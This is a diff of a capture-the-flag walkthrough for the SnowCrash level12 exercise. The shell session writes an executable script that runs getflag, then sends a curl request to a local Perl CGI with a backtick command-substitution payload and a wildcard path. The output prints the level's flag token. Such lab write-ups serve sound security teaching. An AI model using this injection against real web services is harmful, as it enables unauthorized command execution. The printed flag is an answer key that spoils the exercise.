@@ -58,20 +58,16 @@ Instead we will write a file that will get executed.
 Create an executable script which run getflag and redirects its output to a file. Name it with uppercase letters.  
 Because of the first regex, we have to use a wildcard in our path `/*/[EXPLOIT_FILE]` will find every `[EXPLOIT_FILE]`.
 ```
-level12@SnowCrash:~$ vim /tmp/MAXISIMO_SCRIPT
-level12@SnowCrash:~$ cat /tmp/MAXISIMO_SCRIPT
-`getflag` > /tmp/flag
-level12@SnowCrash:~$
-```
-Then use curl as we want to execute a pearl script and make a http call :
-```
 level12@SnowCrash:~$ cd /tmp
 level12@SnowCrash:/tmp$ vim EXPLOIT
-level12@SnowCrash:/tmp$ chmod 777 EXPLOIT
+level12@SnowCrash:/tmp$ chmod 777 EXPLOIT              # otherwise it can't execute getflag
 level12@SnowCrash:/tmp$ cat EXPLOIT
 #!/bin/sh
 getflag > /tmp/flag
-level12@SnowCrash:/tmp$ cd
+level12@SnowCrash:/tmp$
+```
+Then use curl as we want to execute a pearl script and make a http call :
+```
 level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT`'
 ..level12@SnowCrash:~cat /tmp/flag
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
